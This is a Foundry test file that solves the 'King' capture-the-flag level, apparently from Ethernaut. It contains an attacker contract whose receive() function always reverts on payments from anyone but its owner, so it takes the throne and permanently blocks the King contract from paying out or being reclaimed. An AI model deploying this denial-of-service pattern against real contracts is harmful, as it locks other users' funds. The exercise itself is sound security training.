/*
* Don't look at the solution without trying yourself first!
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";
import { King } from "@src/09-King/King.sol";

contract AttackerContract {
    error CallerNotOwner();
    error FailedToOverThrowKing();
    error HahaYouHaveBeenHacked();

    address private immutable owner;
    King private immutable king;

    constructor(address _king) payable {
        owner = msg.sender;
        king = King(payable(_king));
    }

    modifier onlyOwner() {
        if (msg.sender != owner) revert CallerNotOwner();
        _;
    }

    function attack() external onlyOwner {
        if (address(this).balance < king.prize()) revert();
        (bool success,) = address(king).call{ value: address(this).balance }("");
        if (!success) revert FailedToOverThrowKing();
    }

    receive() external payable {
        if (tx.origin != owner) revert HahaYouHaveBeenHacked();
    }
}

contract HackKing is Test {
    King public king;
    address public deployer;
    address public attacker;

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");

        vm.prank(deployer);
        vm.deal(deployer, 1 ether);
        king = new King{ value: 1 ether }();
    }

    function testBecomeTheKing() public {
        // hack the contract
        // your code goes here

        vm.startPrank(attacker);
        vm.deal(attacker, 2 ether);
        AttackerContract attackerContract = new AttackerContract{ value: 2 ether }(address(king));
        attackerContract.attack();
        vm.stopPrank();

        assert(king._king() != deployer);
        vm.expectRevert();
        vm.prank(deployer);
        (bool proclamationSuccess,) = address(king).call{ value: 0 ether }("");
    }
}
